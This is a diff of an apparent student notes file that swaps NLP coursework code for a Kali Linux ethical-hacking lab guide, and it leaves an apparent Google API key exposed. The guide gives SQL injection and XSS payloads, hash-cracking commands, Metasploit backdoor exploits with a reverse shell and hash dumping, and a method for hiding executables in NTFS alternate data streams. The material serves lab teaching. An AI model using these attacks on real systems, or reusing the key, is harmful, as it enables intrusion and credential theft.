@@ -19,437 +19,765 @@ gemini what is genai?
 
 AIzaSyA4SBcN8ys8eci8OQFSh2jVHJWWZN5STbo
 
-#!/usr/bin/env python3
-"""
-NLP Practical File  –  All 10 Practicals
-Subject  : Natural Language Processing
-Faculty  : Dr. Uma Ojha
-"""
-
-import sys, subprocess, re, math, string, random
-from collections import Counter, defaultdict
-import warnings; warnings.filterwarnings('ignore')
-
-def install(p):
-    subprocess.run([sys.executable,'-m','pip','install',p,'-q'], capture_output=True)
-
-for p in ['nltk','scikit-learn','numpy']:
-    install(p)
-
-import nltk, numpy as np
-for c in ['punkt_tab','punkt','stopwords','wordnet','omw-1.4',
-          'averaged_perceptron_tagger_eng','averaged_perceptron_tagger',
-          'maxent_ne_chunker','words','movie_reviews']:
-    try: nltk.download(c, quiet=True)
-    except: pass
-
-from nltk.tokenize import word_tokenize, sent_tokenize
-from nltk.corpus   import stopwords, movie_reviews
-from nltk.stem     import PorterStemmer, WordNetLemmatizer
-from nltk          import pos_tag, ne_chunk
-from nltk.tree     import Tree
-from sklearn.feature_extraction.text import TfidfVectorizer, CountVectorizer
-from sklearn.naive_bayes  import MultinomialNB
-from sklearn.linear_model import LogisticRegression
-from sklearn.svm          import LinearSVC
-from sklearn.pipeline     import Pipeline
-from sklearn.model_selection import train_test_split
-from sklearn.metrics import accuracy_score, classification_report
-
-SEP = "="*64
-
-# ─────────────────────────────────────────────────────────────────
-# PRACTICAL 1 : Text Pre-processing
-# ─────────────────────────────────────────────────────────────────
-print(SEP); print("PRACTICAL 1 : Text Pre-processing"); print(SEP)
-
-text = ("Natural Language Processing (NLP) is a fascinating sub-field of "
-        "Artificial Intelligence (AI). NLP enables computers to understand, "
-        "interpret, and manipulate human language. It is widely used in machine "
-        "translation, sentiment analysis, chatbots, and information retrieval!")
-
-print("Original Text:\n", text, "\n")
-
-sents  = sent_tokenize(text)
-tokens = word_tokenize(text)
-lower  = [t.lower() for t in tokens]
-no_p   = [t for t in lower if t.isalpha()]
-sw     = set(stopwords.words('english'))
-filt   = [t for t in no_p if t not in sw]
-ps     = PorterStemmer(); lem = WordNetLemmatizer()
-stemmed   = [ps.stem(w)           for w in filt]
-lemmatized= [lem.lemmatize(w,'v') for w in filt]
-
-print(f"[1] Sentence Tokens  ({len(sents)})  :", sents)
-print(f"[2] Word Tokens      ({len(tokens)}) :", tokens[:12],"...")
-print(f"[3] Lowercase        ({len(lower)})  :", lower[:12],"...")
-print(f"[4] No Punctuation   ({len(no_p)})   :", no_p[:12],"...")
-print(f"[5] Stop-Words Removed ({len(filt)}, removed {len(no_p)-len(filt)}) :", filt)
-print(f"[6] Stemming         :", stemmed)
-print(f"[7] Lemmatization    :", lemmatized)
-
-# ─────────────────────────────────────────────────────────────────
-# PRACTICAL 2 : Regex Extraction
-# ─────────────────────────────────────────────────────────────────
-print("\n"+SEP); print("PRACTICAL 2 : Regex Patterns – Extraction"); print(SEP)
-
-sample = """
-Reach us at: john.doe@gmail.com, jane_smith@university.edu, admin@company.org
-Follow: #MachineLearning #NLP #ArtificialIntelligence #Python3
-Events: 25-04-2024, 01/12/2023, 2024-03-15
-Call: +91-9876543210, (022) 4567-8901, 1-800-555-0100
-Twitter: @john_doe and @jane_smith posted updates today.
-"""
-
-print("Input Text:", sample)
-
-emails     = re.findall(r'[\w\.-]+@[\w\.-]+\.\w+', sample)
-usernames  = [e.split('@')[0] for e in emails]
-domains    = [e.split('@')[1] for e in emails]
-hashtags   = re.findall(r'#\w+', sample)
-dates      = re.findall(r'\b\d{2}[-/]\d{2}[-/]\d{4}\b|\b\d{4}-\d{2}-\d{2}\b', sample)
-phones     = re.findall(r'(?:\+\d{1,2}[-\s]?)?\(?\d{3}\)?[\s.-]?\d{4}[\s.-]?\d{4}', sample)
-tw_users   = re.findall(r'@\w+', sample)
-
-print("Email Addresses :", emails)
-print("Usernames       :", usernames)
-print("Domains         :", domains)
-print("Hashtags        :", hashtags)
-print("Dates           :", dates)
-print("Phone Numbers   :", phones)
-print("Twitter Handles :", tw_users)
-
-# ─────────────────────────────────────────────────────────────────
-# PRACTICAL 3 : Most Common Words
-# ─────────────────────────────────────────────────────────────────
-print("\n"+SEP); print("PRACTICAL 3 : Most Common Words (excl. stop-words)"); print(SEP)
-
-corpus = """
-Machine learning is a method of data analysis that automates analytical
-model building. It is based on the idea that systems can learn from data,
-identify patterns and make decisions with minimal human intervention.
-Deep learning is part of a broader family of machine learning methods
-based on artificial neural networks with representation learning.
-Natural language processing is a subfield of linguistics, computer science,
-and artificial intelligence concerned with the interactions between computers
-and human language, in particular how to program computers to process and
-analyze large amounts of natural language data.
-"""
-
-tokens3 = word_tokenize(corpus.lower())
-clean3  = [t for t in tokens3 if t.isalpha() and t not in sw]
-freq    = Counter(clean3).most_common(20)
-
-print(f"Corpus word count (raw): {len(tokens3)}")
-print(f"After cleaning:          {len(clean3)} content words\n")
-print(f"{'Rank':<5} {'Word':<20} {'Frequency':<10} {'Bar'}")
-print("-"*55)
-for rank,(word,count) in enumerate(freq,1):
-    bar = '#'*count
-    print(f"{rank:<5} {word:<20} {count:<10} {bar}")
-
-# ─────────────────────────────────────────────────────────────────
-# PRACTICAL 4 : TF-IDF Matrix
-# ─────────────────────────────────────────────────────────────────
-print("\n"+SEP); print("PRACTICAL 4 : TF-IDF Matrix"); print(SEP)
-
-docs = [
-    "machine learning algorithms build models from training data",
-    "deep learning uses neural networks for image and speech recognition",
-    "natural language processing analyzes and understands human text",
-    "information retrieval systems search and rank relevant documents",
-    "data science combines statistics programming and domain knowledge",
-]
-for i,d in enumerate(docs,1): print(f"  Doc {i}: {d}")
-
-vec   = TfidfVectorizer(stop_words='english', max_features=12)
-mat   = vec.fit_transform(docs).toarray()
-terms = vec.get_feature_names_out()
-
-print(f"\nTF-IDF Matrix  ({len(docs)} docs  x  {len(terms)} terms)\n")
-print(f"{'Term':<18}", end='')
-for i in range(len(docs)): print(f"{'Doc'+str(i+1):>8}", end='')
-print()
-print("-"*(18+len(docs)*8))
-for j,t in enumerate(terms):
-    print(f"{t:<18}", end='')
-    for i in range(len(docs)): print(f"{mat[i][j]:8.4f}", end='')
-    print()
-
-# ─────────────────────────────────────────────────────────────────
-# PRACTICAL 5 : Statistical Language Model
-# ─────────────────────────────────────────────────────────────────
-print("\n"+SEP); print("PRACTICAL 5 : Unigram & Bigram Language Model + Add-1 Smoothing"); print(SEP)
-
-lm_corpus = [
-    "the cat sat on the mat",
-    "the cat ate the rat",
-    "the dog sat on the log",
-    "a dog and a cat played in the park",
-]
-
-all_toks = []
-for s in lm_corpus: all_toks.extend(s.split())
-
-V         = len(set(all_toks))  # vocabulary size
-N         = len(all_toks)
-uni_freq  = Counter(all_toks)
-bi_freq   = Counter(zip(all_toks, all_toks[1:]))
-
-def p_unigram(w):       return (uni_freq[w]+1)/(N+V)
-def p_bigram(w2,w1):    return (bi_freq[(w1,w2)]+1)/(uni_freq[w1]+V)
-
-print(f"Corpus : {lm_corpus}")
-print(f"Tokens : {N}  |  Vocabulary : {V}\n")
-
-show_words = ['cat','dog','sat','rat','mat','played']
-print(f"{'Word':<12} {'Count':>6}  {'P(w) smoothed':>16}")
-print("-"*38)
-for w in show_words:
-    print(f"{w:<12} {uni_freq[w]:>6}  {p_unigram(w):>16.6f}")
-
-print(f"\n{'Bigram':<18} {'Count':>6}  {'P(w2|w1) smoothed':>20}")
-print("-"*48)
-show_bigrams = [('cat','the'),('sat','cat'),('dog','the'),('log','on'),('park','the')]
-for (w2,w1) in show_bigrams:
-    print(f"P({w2}|{w1}):{'':<6} {bi_freq[(w1,w2)]:>3}  {p_bigram(w2,w1):>20.6f}")
-
-test_sents = ["the cat sat on the mat", "the dog ate the rat", "a cat played in park"]
-print("\nSentence Log-Probabilities (bigram, add-1 smoothing):")
-for s in test_sents:
-    wds  = s.split()
-    logp = math.log(p_unigram(wds[0]))
-    for i in range(1,len(wds)): logp += math.log(p_bigram(wds[i],wds[i-1]))
-    print(f"  '{s}'  =>  log P = {logp:.4f}")
-
-# ─────────────────────────────────────────────────────────────────
-# PRACTICAL 6 : POS Tagging
-# ─────────────────────────────────────────────────────────────────
-print("\n"+SEP); print("PRACTICAL 6 : POS Tagging, Noun Extraction, POS Frequency"); print(SEP)
-
-news = ("The Prime Minister of India announced a new artificial intelligence "
-        "policy on Monday. Scientists and engineers across universities will "
-        "collaborate on research projects funded by the government. The initiative "
-        "aims to develop advanced algorithms for healthcare, agriculture, and education.")
-
-toks6   = word_tokenize(news)
-tagged  = pos_tag(toks6)
-print("POS Tagged Text (first 20 tokens):")
-for tok,tag in tagged[:20]:
-    print(f"  {tok:<20} {tag}")
-
-nouns = [w for w,t in tagged if t in ('NN','NNS','NNP','NNPS')]
-print(f"\nNouns extracted ({len(nouns)}): {nouns}")
-
-pos_freq = Counter(t for _,t in tagged)
-print("\nPOS Frequency Dictionary:")
-for tag,cnt in sorted(pos_freq.items(), key=lambda x:-x[1]):
-    print(f"  {tag:<8} : {cnt}")
-
-# ─────────────────────────────────────────────────────────────────
-# PRACTICAL 7 : Named Entity Recognition (NER)
-# ─────────────────────────────────────────────────────────────────
-print("\n"+SEP); print("PRACTICAL 7 : Named Entity Recognition (NER)"); print(SEP)
-
-headlines = [
-    "Apple Inc CEO Tim Cook announced new iPhone models in San Francisco.",
-    "Narendra Modi met Joe Biden at the White House in Washington D.C.",
-    "Google and Microsoft are investing heavily in artificial intelligence.",
-    "The United Nations held a climate summit in New York last Friday.",
-    "Elon Musk's SpaceX launched a new satellite from Cape Canaveral.",
-]
-
-print("News Headlines:")
-for h in headlines: print(f"  - {h}")
-print("\nNamed Entities:")
-
-entity_counter = Counter()
-for hl in headlines:
-    toks7  = word_tokenize(hl)
-    tagged7= pos_tag(toks7)
-    tree   = ne_chunk(tagged7, binary=False)
-    for subtree in tree:
-        if isinstance(subtree, Tree):
-            entity = " ".join(w for w,t in subtree.leaves())
-            label  = subtree.label()
-            entity_counter[label] += 1
-            print(f"  [{label:<12}]  {entity}")
-
-print("\nEntity Type Frequency:")
-for etype, cnt in entity_counter.most_common():
-    print(f"  {etype:<12} : {cnt}")
-
-# ─────────────────────────────────────────────────────────────────
-# PRACTICAL 8 : Movie Review Sentiment Classification (IMDB / NLTK)
-# ─────────────────────────────────────────────────────────────────
-print("\n"+SEP); print("PRACTICAL 8 : Movie Review Sentiment Classification"); print(SEP)
-print("Dataset: NLTK movie_reviews corpus (2000 reviews: 1000 pos / 1000 neg)")
-
-try:
-    fileids = movie_reviews.fileids()
-    data8   = [(movie_reviews.raw(fid), cat)
-               for cat in movie_reviews.categories()
-               for fid in movie_reviews.fileids(cat)]
-    random.seed(42); random.shuffle(data8)
-    texts8,labels8 = zip(*data8)
-
-    X_tr,X_te,y_tr,y_te = train_test_split(texts8, labels8, test_size=0.2, random_state=42)
-
-    pipe = Pipeline([
-        ('tfidf', TfidfVectorizer(stop_words='english', max_features=8000, ngram_range=(1,2))),
-        ('clf',   LogisticRegression(max_iter=1000, random_state=42)),
-    ])
-    pipe.fit(X_tr, y_tr)
-    y_pred = pipe.predict(X_te)
-    acc    = accuracy_score(y_te, y_pred)
-
-    print(f"\nTraining samples : {len(X_tr)}  |  Test samples : {len(X_te)}")
-    print(f"Model            : Logistic Regression (TF-IDF features, bigrams)")
-    print(f"Test Accuracy    : {acc*100:.2f}%\n")
-    print(classification_report(y_te, y_pred))
-
-    custom = [
-        "An absolutely brilliant film with a gripping storyline and great acting.",
-        "Terrible movie, complete waste of time. The plot made no sense at all.",
-        "A decent film overall, though a bit slow in the middle sections.",
-        "One of the best movies I have ever seen! Masterpiece of cinema.",
-    ]
-    preds = pipe.predict(custom)
-    print("Custom Review Predictions:")
-    for rev,pred in zip(custom,preds):
-        print(f"  [{pred.upper():3}]  {rev[:60]}...")
-except Exception as e:
-    print(f"NLTK movie_reviews not available: {e}")
-    print("Using a small custom dataset for demonstration...")
-    # Fallback: small custom dataset
-    pos = ["great movie","loved it","brilliant acting","masterpiece cinema","excellent film","wonderful story"]
-    neg = ["terrible film","waste of time","awful acting","boring plot","horrible movie","worst film ever"]
-    texts8  = pos+neg
-    labels8 = ['pos']*6+['neg']*6
-    X_tr,X_te,y_tr,y_te = train_test_split(texts8, labels8, test_size=0.33, random_state=42)
-    pipe = Pipeline([('cv',CountVectorizer()),('nb',MultinomialNB())])
-    pipe.fit(X_tr,y_tr); y_pred=pipe.predict(X_te)
-    print(f"Accuracy: {accuracy_score(y_te,y_pred)*100:.1f}%")
-    print(classification_report(y_te,y_pred))
-
-# ─────────────────────────────────────────────────────────────────
-# PRACTICAL 9 : Text Classifier (sklearn Pipeline)
-# ─────────────────────────────────────────────────────────────────
-print("\n"+SEP); print("PRACTICAL 9 : Text Classifier (Multi-class, sklearn)"); print(SEP)
-
-sports_data = [
-    ("The team scored a hat-trick in the final football match.", "sports"),
-    ("Manchester United won the Premier League title this season.", "sports"),
-    ("The cricket team won the test series against Australia.", "sports"),
-    ("Virat Kohli hit a century in the third ODI match today.", "sports"),
-    ("The NBA finals concluded with the Lakers winning game seven.", "sports"),
-    ("Scientists discovered a new exoplanet in the Milky Way galaxy.", "science"),
-    ("NASA launched the Artemis mission to orbit the moon successfully.", "science"),
-    ("Researchers developed a new vaccine effective against influenza.", "science"),
-    ("A breakthrough in quantum computing was achieved at MIT labs.", "science"),
-    ("CRISPR gene editing technology advances cancer treatment research.", "science"),
-    ("The stock market crashed amid fears of global economic recession.", "politics"),
-    ("Parliament passed the new education reform bill after debate.", "politics"),
-    ("The president signed an executive order on climate change policy.", "politics"),
-    ("Elections were held in five states with high voter turnout today.", "politics"),
-    ("The government announced a new budget for infrastructure spending.", "politics"),
-    ("A new AI model surpasses human performance on language tasks.", "technology"),
-    ("Apple unveiled its latest M-series chip at the WWDC conference.", "technology"),
-    ("OpenAI released GPT-4 with advanced multimodal capabilities.", "technology"),
-    ("Google DeepMind achieved a breakthrough in protein structure prediction.", "technology"),
-    ("SpaceX Starship completed its third integrated flight test.", "technology"),
-]
-
-texts9, labels9 = zip(*sports_data)
-X_tr9,X_te9,y_tr9,y_te9 = train_test_split(texts9,labels9,test_size=0.25,random_state=42,stratify=labels9)
-
-pipe9 = Pipeline([
-    ('tfidf', TfidfVectorizer(ngram_range=(1,2), min_df=1)),
-    ('clf',   LinearSVC(max_iter=2000, random_state=42)),
-])
-pipe9.fit(X_tr9,y_tr9)
-y_pred9 = pipe9.predict(X_te9)
-
-print(f"Classes   : {sorted(set(labels9))}")
-print(f"Train     : {len(X_tr9)} samples  |  Test : {len(X_te9)} samples")
-print(f"Accuracy  : {accuracy_score(y_te9,y_pred9)*100:.1f}%\n")
-print(classification_report(y_te9, y_pred9))
-
-test9 = [
-    "Rohit Sharma led India to victory in the T20 World Cup.",
-    "The government will announce a new space exploration policy.",
-    "Samsung released the Galaxy S25 with new camera features.",
-]
-preds9 = pipe9.predict(test9)
-print("New Sample Predictions:")
-for s,p in zip(test9,preds9):
-    print(f"  [{p.upper():<10}]  {s}")
-
-# ─────────────────────────────────────────────────────────────────
-# PRACTICAL 10 : Character-based Language Model
-# ─────────────────────────────────────────────────────────────────
-print("\n"+SEP); print("PRACTICAL 10 : Character-based Language Model (N-gram)"); print(SEP)
-
-shakespeare = (
-    "to be or not to be that is the question whether tis nobler in the mind "
-    "to suffer the slings and arrows of outrageous fortune or to take arms "
-    "against a sea of troubles and by opposing end them to die to sleep no "
-    "more and by a sleep to say we end the heartache and the thousand natural "
-    "shocks that flesh is heir to tis a consummation devoutly to be wished "
-    "to die to sleep to sleep perchance to dream ay there is the rub for in "
-    "that sleep of death what dreams may come when we have shuffled off this "
-    "mortal coil must give us pause there is the respect that makes calamity "
-    "of so long life for who would bear the whips and scorns of time "
-)
-
-print(f"Corpus: Shakespeare excerpt ({len(shakespeare)} characters)\n")
-
-N_GRAM = 4
-
-# Build n-gram model
-model = defaultdict(Counter)
-for i in range(len(shakespeare) - N_GRAM):
-    ctx  = shakespeare[i:i+N_GRAM]
-    nxt  = shakespeare[i+N_GRAM]
-    model[ctx][nxt] += 1
-
-vocab = sorted(set(shakespeare))
-print(f"Vocabulary ({len(vocab)} unique chars): {repr(''.join(vocab))}")
-print(f"N-gram order: {N_GRAM}")
-print(f"Unique {N_GRAM}-gram contexts: {len(model)}\n")
-
-def predict_next_char(ctx):
-    ctx = ctx[-N_GRAM:]
-    if ctx in model:
-        return max(model[ctx], key=model[ctx].get)
-    return ' '
-
-# Show top contexts
-print("Top 8 contexts and their most likely next character:")
-top_ctx = sorted(model.items(), key=lambda x: -sum(x[1].values()))[:8]
-for ctx, ctr in top_ctx:
-    best = max(ctr, key=ctr.get)
-    print(f"  '{ctx}'  =>  next: '{best}'  (top-3: {dict(ctr.most_common(3))})")
-
-# Generate text
-def generate_text(seed, length=80):
-    text = seed
-    for _ in range(length):
-        text += predict_next_char(text)
-    return text
-
-seeds = ["to b", "the ", "slee", "drea"]
-print("\nGenerated Text Samples:")
-for seed in seeds:
-    gen = generate_text(seed, 70)
-    print(f"  Seed '{seed}': {gen}")
-
-# Character-level prediction accuracy on corpus
-correct = sum(predict_next_char(shakespeare[i:i+N_GRAM]) == shakespeare[i+N_GRAM]
-              for i in range(len(shakespeare)-N_GRAM))
-total   = len(shakespeare) - N_GRAM
-print(f"\nCharacter Prediction Accuracy ({N_GRAM}-gram): {correct}/{total} = {correct/total*100:.1f}%")
-
-print("\n" + SEP)
+   
+Ethical Hacking Practicals — Kali Linux
+Guide
+DSE/GE7e | Semester VI/VII
+⚠ Disclaimer: All practicals must be performed only in controlled, isolated lab
+environments (virtual machines). Never use these techniques on real systems without
+explicit written permission. Unauthorized use is illegal and unethical.
+Table of Contents
+P1 — OWASP Top 10 & Vulnerable Web Applications
+P2 — Network Scanning and Reconnaissance
+P3 — Password Cracking
+P4 — Metasploit Basics
+P5 — Alternate Data Streams (ADS)
+P6 — SQL Injection
+P7 — Framework Mapping (NIST / Cyber Kill Chain)
+P8 — Vulnerability Assessment Report
+P1 — OWASP Top 10 & Vulnerable Web Applications
+Objective
+Set up OWASP Juice Shop or DVWA on a virtual machine and identify vulnerabilities such as
+SQL Injection and Cross-Site Scripting (XSS).
+Prerequisites
+Kali Linux (as attacker/tester VM)
+VirtualBox or VMware installed
+Internet connection (for initial setup)
+Part A: Setting Up DVWA (Damn Vulnerable Web Application)
+Step 1: Install DVWA dependencies
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y apache2 php php-mysqli mariadb-server git
+Step 2: Start Apache and MariaDB services
+sudo systemctl start apache2
+sudo systemctl start mariadb
+sudo systemctl enable apache2
+sudo systemctl enable mariadb
+Step 3: Clone DVWA into the web root
+cd /var/www/html
+sudo git clone https://github.com/digininja/DVWA.git
+sudo mv DVWA dvwa
+sudo chmod -R 777 /var/www/html/dvwa
+Step 4: Configure DVWA database settings
+cd /var/www/html/dvwa/config
+sudo cp config.inc.php.dist config.inc.php
+sudo nano config.inc.php
+Edit the following lines:
+$_DVWA[ 'db_user' ]     
+= 'dvwa';
+$_DVWA[ 'db_password' ] = 'p@ssw0rd';
+$_DVWA[ 'db_database' ] = 'dvwa';
+Step 5: Create the DVWA database and user
+sudo mysql -u root -p
+Inside the MySQL shell:
+CREATE DATABASE dvwa;
+CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
+GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
+FLUSH PRIVILEGES;
+EXIT;
+Step 6: Access DVWA in the browser
+Open Firefox in Kali and navigate to:
+http://localhost/dvwa/setup.php
+Click "Create / Reset Database".
+Then go to:
+http://localhost/dvwa/login.php
+Login with:
+Username: 
+admin
+Password: 
+password
+Step 7: Set security level to Low
+Go to DVWA Security tab → Set level to Low → Click Submit.
+Part B: Setting Up OWASP Juice Shop (Alternative)
+Step 1: Install Node.js and npm
+sudo apt install -y nodejs npm
+node -v    
+# Verify installation
+Step 2: Install Juice Shop via npm
+sudo npm install -g juice-shop
+Step 3: Start Juice Shop
+juice-shop
+Open browser and go to:
+http://localhost:3000
+Part C: Identifying Vulnerabilities
+Identifying SQL Injection in DVWA
+1. Go to SQL Injection section in DVWA.
+2. In the User ID field, enter:
+1' OR '1'='1
+3. Observe that all user records are returned — this confirms SQL injection vulnerability.
+4. Try:
+1' UNION SELECT user, password FROM users-- 
+5. Note the usernames and hashed passwords displayed.
+Identifying XSS (Cross-Site Scripting) in DVWA
+1. Go to XSS (Reflected) section.
+2. In the name field, enter:
+<script>alert('XSS Vulnerability Found!')</script>
+3. A pop-up box confirms the reflected XSS vulnerability.
+4. Go to XSS (Stored) section.
+5. In the message box, enter the same script — this time it persists and fires every time the
+page loads.
+Expected Outcome
+DVWA or Juice Shop running locally
+Identified at least one SQL injection and one XSS vulnerability
+Understanding of OWASP Top 10 categories
+P2 — Network Scanning and Reconnaissance
+Objective
+Use network tools to explore configurations, perform scanning with Nmap, and analyze
+traffic with Wireshark on pre-captured 
+.pcap
+ files.
+Prerequisites
+Kali Linux
+Target VM on the same host-only/NAT network (e.g., Metasploitable2)
+Wireshark installed (pre-installed in Kali)
+Sample 
+.pcap
+ file
+Step 1: Basic Network Configuration Commands
+# Display IP configuration (Linux equivalent of ipconfig)
+ifconfig
+# OR use the modern tool
+ip addr show
+ip route show
+# View ARP cache
+arp -a
+# Test connectivity
+ping -c 4 192.168.1.1
+# Display hostname
+hostname
+hostname -I
+Understand the output:
+inet
+ — Your IPv4 address
+ether
+ — MAC address
+RX/TX packets
+ — Network traffic statistics
+Step 2: DNS and Domain Reconnaissance
+# Lookup DNS records for a domain
+nslookup example.com
+dig example.com
+dig example.com MX        
+# Mail records
+dig example.com NS        
+dig example.com ANY       
+# Name server records
+# All records
+# Trace the route to a host
+traceroute example.com
+# WHOIS lookup
+whois example.com
+Step 3: Network Scanning with Nmap
+⚠ Only scan networks and hosts you own or have explicit permission to test.
+# First, find your own IP range
+ip addr show
+# Discover live hosts on the local network
+nmap -sn 192.168.1.0/24
+# Basic port scan of target VM
+nmap 192.168.1.100
+# Scan specific ports
+nmap -p 22,80,443,3306 192.168.1.100
+# Service and version detection
+nmap -sV 192.168.1.100
+# OS detection
+nmap -O 192.168.1.100
+# Aggressive scan (OS + version + scripts + traceroute)
+nmap -A 192.168.1.100
+# Save results to a file
+nmap -A 192.168.1.100 -oN scan_results.txt
+nmap -A 192.168.1.100 -oX scan_results.xml   # XML format
+Understanding Nmap output:
+open
+ — Port is accepting connections
+closed
+ — Port is reachable but no service
+filtered
+ — Firewall may be blocking
+Step 4: Analyzing Network Traffic with Wireshark
+Option A: Using Pre-Captured 
+.pcap
+ Files (Recommended — No live
+capture needed)
+# Download sample pcap files
+wget https://www.malware-traffic-analysis.net/training-exercises.html
+# OR use Kali's built-in samples
+ls /usr/share/wireshark/
+Open Wireshark GUI:
+wireshark &
+1. Go to File → Open → Select a 
+.pcap
+ file.
+2. Apply display filters in the filter bar:
+# Filter only HTTP traffic
+http
+# Filter by IP address
+ip.addr == 192.168.1.100
+# Filter TCP traffic
+tcp
+# Filter DNS queries
+dns
+# Filter by port
+tcp.port == 80
+# Follow a TCP stream: right-click a packet → Follow → TCP Stream
+3. Analyze the Protocol Hierarchy: Go to Statistics → Protocol Hierarchy.
+4. View Conversations: Go to Statistics → Conversations.
+Expected Outcome
+Identified network hosts, open ports, and services
+Captured and analyzed network traffic patterns
+Documented findings in a brief scan report
+P3 — Password Cracking
+Objective
+Use John the Ripper and Hashcat to crack simple password hashes generated in a test
+environment.
+Prerequisites
+Kali Linux (both tools are pre-installed)
+Sample hash values only — never target real systems
+Step 1: Generate Sample Password Hashes
+# Generate an MD5 hash
+echo -n "password123" | md5sum
+# Output: 482c811da5d5b4bc6d497ffa98491e38
+# Generate a SHA1 hash
+echo -n "password123" | sha1sum
+# Generate a SHA-256 hash
+echo -n "password123" | sha256sum
+# Create a file with multiple hashes to crack
+echo "482c811da5d5b4bc6d497ffa98491e38" > hashes.txt
+echo "5f4dcc3b5aa765d61d8327deb882cf99" >> hashes.txt
+Step 2: Cracking Hashes with John the Ripper
+# Check John the Ripper version
+john --version
+# Crack using default wordlist
+john hashes.txt
+# Use the built-in wordlist
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+# Specify hash format explicitly
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt 
+hashes.txt
+# Show cracked passwords
+john --show hashes.txt
+# Use incremental (brute-force) mode
+john --incremental hashes.txt
+Note: If 
+rockyou.txt
+ is compressed, extract it first:
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+Step 3: Cracking Hashes with Hashcat
+# Check Hashcat version
+hashcat --version
+# Identify hash type (example: MD5 = mode 0, SHA1 = 100, SHA256 = 1400)
+# Full list: hashcat --help | grep -i md5
+# Dictionary attack with MD5 hashes
+hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+# Brute-force attack (try all 4–6 character combinations)
+hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
+# Show cracked results
+hashcat -m 0 hashes.txt --show
+# Save results to output file
+hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -o 
+cracked.txt
+Hashcat mask characters:
+Mask
+Character Set
+?l
+?u
+?d
+?s
+?a
+Lowercase letters (a-z)
+Uppercase letters (A-Z)
+Digits (0-9)
+Special characters
+All of the above
+Step 4: Linux 
+/etc/shadow
+ Format (Simulation)
+# Create a test shadow-format hash
+python3 -c "import crypt; print(crypt.crypt('testpass', 
+crypt.mksalt(crypt.METHOD_SHA512)))"
+# Save it and crack with John
+echo 'testuser:$6$salt$hashedvalue:18000:0:99999:7:::' > shadow_test.txt
+john shadow_test.txt
+Expected Outcome
+Successfully cracked at least 2‒3 sample hashes
+Understood the difference between dictionary and brute-force attacks
+Learned countermeasures: use of salted hashes, bcrypt, longer passwords
+P4 — Metasploit Basics
+Objective
+Set up Metasploitable2 as a target VM and practice exploitation using the Metasploit
+Framework.
+Prerequisites
+Kali Linux (attacker)
+Metasploitable2 VM (target) — Download from SourceForge
+Both VMs on the same Host-Only network
+Step 1: Set Up the Lab Network
+1. In VirtualBox/VMware, set both VMs to Host-Only Adapter.
+2. Boot Metasploitable2.
+3. Login: 
+msfadmin
+ / 
+msfadmin
+4. Note its IP address:
+ifconfig
+Step 2: Start Metasploit on Kali
+# Update the Metasploit database
+sudo msfdb init
+# Start Metasploit console
+msfconsole
+You will see the 
+msf6 >
+ prompt.
+Step 3: Reconnaissance Inside Metasploit
+# Inside msfconsole — scan the target
+db_nmap -sV -O 192.168.56.101
+# View discovered hosts
+hosts
+# View discovered services
+services
+Step 4: Exploit vsftpd 2.3.4 Backdoor (Classic Metasploitable2
+Exploit)
+# Search for the exploit
+search vsftpd
+# Use the module
+use exploit/unix/ftp/vsftpd_234_backdoor
+# Show options
+show options
+# Set the target host
+set RHOSTS 192.168.56.101
+# Set the payload
+set PAYLOAD cmd/unix/interact
+# Launch the exploit
+exploit
+If successful, you get a shell on the target:
+# Confirm access
+id
+whoami
+uname -a
+Step 5: Exploit Samba (MS08-067 style on Linux — unreal_ircd)
+# Back to main prompt
+back
+# Search for UnrealIRCd
+search unreal_ircd
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 192.168.56.101
+set PAYLOAD cmd/unix/reverse
+set LHOST 192.168.56.102   # Your Kali IP
+exploit
+Step 6: Post-Exploitation (Information Gathering)
+Once you have a Meterpreter or shell session:
+# If Meterpreter session
+sysinfo          
+getuid           
+ps               
+hashdump         
+shell            
+# System information
+# Current user
+# Running processes
+# Dump password hashes (if privileged)
+# Drop to system shell
+Step 7: Pivoting to Other Modules
+# List all active sessions
+sessions -l
+# Interact with session 1
+sessions -i 1
+# Background a session
+background
+Expected Outcome
+Successfully gained access to Metasploitable2
+Understood the exploit/payload/session model
+Learned post-exploitation basics and responsible disclosure mindset
+P5 — Alternate Data Streams (ADS)
+Objective
+Understand how ADS works on Windows NTFS, create hidden streams, detect them, and
+apply countermeasures. (Performed on a Windows VM from Kali host, or directly on a
+Windows VM.)
+Note: ADS is a Windows NTFS feature. Perform this on a Windows VM (e.g., Windows
+10). You can control the Windows VM via Kali using RDP.
+Step 1: Connect to Windows VM from Kali (Optional)
+# Install RDP client if needed
+sudo apt install remmina -y
+# Connect to Windows VM
+remmina
+# OR
+rdesktop 192.168.56.103
+Step 2: Create a Normal File (on Windows VM)
+Open Command Prompt on the Windows VM:
+cd C:\ADSTest
+mkdir C:\ADSTest
+cd C:\ADSTest
+echo This is visible content > normal.txt
+type normal.txt
+Step 3: Create an Alternate Data Stream
+# Hide text inside the ADS
+echo This is hidden data > normal.txt:hidden.txt
+# The file size of normal.txt appears unchanged
+dir normal.txt
+# Read the hidden stream
+more < normal.txt:hidden.txt
+Step 4: Hide an Executable in ADS
+# Copy calc.exe into an ADS of a text file
+type C:\Windows\System32\calc.exe > normal.txt:calc.exe
+# Check: normal.txt still looks like a small text file
+dir normal.txt
+# Run the hidden executable from ADS
+wmic process call create "C:\ADSTest\normal.txt:calc.exe"
+Step 5: Detecting ADS (Countermeasures)
+# List all streams using dir /r
+dir /r C:\ADSTest\
+# Use streams.exe (Sysinternals — download on the VM)
+streams.exe C:\ADSTest\normal.txt
+# Delete all alternate data streams
+streams.exe -d C:\ADSTest\normal.txt
+From Kali, you can also detect ADS remotely:
+# Using Metasploit post-exploitation module
+use post/windows/gather/enum_ads
+set SESSION 1
+run
+Step 6: Using Kali to Analyze Windows ADS (via shared folder)
+# If the Windows disk is mounted in Kali
+getfattr -n ntfs.streams.list /mnt/windows/ADSTest/normal.txt
+# OR use the ntfs-3g tools
+sudo apt install ntfs-3g attr -y
+Expected Outcome
